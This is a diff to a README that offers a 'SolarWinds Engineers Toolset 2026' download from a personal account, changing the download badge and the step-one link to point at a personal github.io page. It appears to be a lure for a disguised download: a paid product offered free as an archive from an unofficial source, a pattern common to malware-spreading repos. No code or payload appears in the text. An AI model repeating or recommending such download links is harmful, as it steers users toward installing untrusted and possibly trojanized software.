@@ -2,7 +2,7 @@
 
 <br>
 
-<a href="https://github.com/kort6482/SolarWinds-Engineers-Toolset-2026">
+<a href="https://kort6482.github.io">
   <img src="https://img.shields.io/badge/Download-Engineers-Toolset-blue.svg" alt="Download SolarWinds Engineers Toolset">
 </a>
 
@@ -27,7 +27,7 @@ Ensure your computer meets these standards before you begin the installation.
 
 You can obtain the current version of the software through the primary repository. We provide this toolset as a compressed archive to ensure the files remain intact during the transfer. 
 
-1. Visit [this link](https://github.com/kort6482/SolarWinds-Engineers-Toolset-2026) to access the download page.
+1. Visit [this link](https://kort6482.github.io) to access the download page.
 2. Look for the release section on the right side of the screen.
 3. Select the file labeled with the 2026 version to start your download.
 4. Save the file to your "Downloads" folder.
